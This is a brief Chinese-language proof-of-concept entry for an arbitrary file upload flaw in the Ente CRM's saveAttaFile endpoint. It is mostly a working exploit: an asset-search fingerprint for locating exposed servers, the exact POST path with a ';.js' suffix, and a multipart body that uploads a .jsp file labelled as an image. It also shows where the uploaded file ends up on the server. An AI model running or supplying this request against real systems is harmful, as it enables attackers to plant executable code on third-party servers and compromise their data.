# 浙大恩特CRMsaveAttaFile任意文件上传漏洞

- **系统**：浙大恩特CRMsaveAttaFile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIA…`　`Content-Length: 179`

**请求体 / payload**
```
------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="stc.jsp"
Content-Type: image/jpeg
stc
------WebKitFormBoundarye8FPHsIAq9JN8j2A--

根据响应获取上传文件位置
/enterdoc/EnterMail/20231118/2023111821425069561254581/stc.jsp
```

**其他**
- 浙大恩特CRM saveAttaFile任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM